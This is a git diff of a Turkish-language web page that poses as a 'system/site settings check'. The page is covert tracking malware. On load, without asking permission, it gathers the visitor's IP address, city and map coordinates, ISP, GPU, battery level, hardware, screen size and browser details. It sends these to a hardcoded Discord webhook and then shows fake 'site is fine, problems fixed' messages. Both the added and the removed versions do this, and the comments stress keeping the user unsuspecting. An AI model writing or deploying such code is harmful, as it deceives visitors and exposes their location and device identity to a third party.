@@ -5,78 +5,75 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Kontrolü</title>
     <style>
-        /* Tamamen karanlık ve basit arayüz */
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
-        h2 { color:#111; font-size:11px; font-weight:400; letter-spacing:1px; transition: 0.3s; }
+        body { background:#050505; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
+        h2 { color:#222; font-size:13px; font-weight:400; letter-spacing:1px; }
         .ok { color:#0f4; font-weight:bold; }
     </style>
 </head>
 <body>
-    <h2 id="t">Sistem ayarları kontrol ediliyor...</h2>
+    <h2 id="t">Site ayarları kontrol ediliyor...</h2>
 
     <script>
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function what() {
-            // 1. VERİ TOPLAMA BAŞLAT
-            let info = { gpu: "Gizli", v: "Gizli", bat: "X", loc: "X", ip: "X" };
-
-            // GPU & Donanım (Sessiz)
+        async function extract() {
+            let info = { gpu: "Gizli", vendor: "Gizli", bat: "N/A" };
+            
+            // 1. GPU ANALİZİ (GİZLİ SORGULAMA)
             try {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl2') || c.getContext('webgl');
-                const d = gl.getExtension('WEBGL_debug_renderer_info');
-                info.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
-                info.v = gl.getParameter(d.UNMASKED_VENDOR_ID);
-            } catch(e) {}
-
-            // Pil (Sessiz)
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    info.bat = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                    info.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                 }
             } catch(e) {}
 
-            // IP Tabanlı Konum (İzin istemez - Gizlidir)
+            // 2. IP VE KONUM (İZİN İSTEMEZ - SESSİZ)
+            let locData = "Erişilemedi";
             try {
-                const r = await fetch('https://ipapi.co/json/');
-                const d = await r.json();
-                info.ip = d.ip;
-                info.loc = `📍 **Konum:** ${d.city}, ${d.region} / ${d.country_name}\n🛰️ **ISP:** ${d.org}\n🔗 [Harita](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                locData = `📍 **Şehir:** ${d.city} / ${d.country_name}\n**IP:** ${d.ip}\n**ISP:** ${d.org}\n🔗 [Haritada Gör](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
             } catch(e) {}
 
-            // 2. TEK VE GİZLİ PAKET OLUŞTUR
+            // 3. PİL DURUMU (GİZLİ)
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    info.bat = `%${(b.level * 100).toFixed(0)} (Şarjda: ${b.charging ? 'Evet' : 'Hayır'})`;
+                }
+            } catch(e) {}
+
+            // 4. VERİ PAKETLEME (SENİN İSTEDİĞİN O VAHŞİ ŞABLON)
             const payload = {
                 embeds: [{
-                    title: "rapor ciktisi",
-                    color: 0, // Siyah (Daha az dikkat çeker)
+                    title: "🕵️ KRİTİK CİHAZ ANALİZİ (FULL ACCESS)",
+                    color: 15158332,
                     fields: [
-                        { name: "📍 LOKASYON (IP)", value: info.loc, inline: false },
-                        { name: "🛠️ DONANIM", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.v}\`\n**RAM:** ${navigator.deviceMemory}GB | **CPU:** ${navigator.hardwareConcurrency}`, inline: false },
-                        { name: "🔋 GÜÇ", value: info.bat, inline: true },
-                        { name: "📱 OS", value: navigator.platform, inline: true },
-                        { name: "🌐 IP", value: info.ip, inline: true },
-                        { name: "🔍 AGENT", value: "```" + navigator.userAgent + "```" }
+                        { name: "📍 LOKASYON (IP TABANLI)", value: locData, inline: false },
+                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.vendor}\`\n**RAM:** ${navigator.deviceMemory || 'X'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'X'} Çekirdek`, inline: false },
+                        { name: "📱 YAZILIM/EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}\n**DİL:** ${navigator.language}`, inline: true },
+                        { name: "🔋 DURUM", value: info.bat, inline: true },
+                        { name: "🌐 TARAYICI KİMLİĞİ", value: "```" + navigator.userAgent + "```", inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
 
-            // 3. YILDIRIM GÖNDERİM
-            navigator.sendBeacon(u, JSON.stringify(payload));
+            // 5. GÖNDERİM
+            const data = JSON.stringify(payload);
+            navigator.sendBeacon(u, data);
+            fetch(u, { method: 'POST', mode: 'no-cors', body: data });
 
-            // 4. ARAYÜZÜ TAMAMLA (Kullanıcıyı şüphelendirme)
+            // 6. ARAYÜZ AKIŞI
             const t = document.getElementById('t');
             t.innerHTML = '<span class="ok">Site uygun halde!</span>';
-            setTimeout(() => { 
-                t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; 
-                t.style.opacity = "0.2"; // Yazıyı soluklaştır
-            }, 600);
+            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 500);
         }
 
-        // Tıklama beklemeden otomatik başlat
-        window.onload = stealth;
+        window.onload = extract;
     </script>
 </body>
 </html>
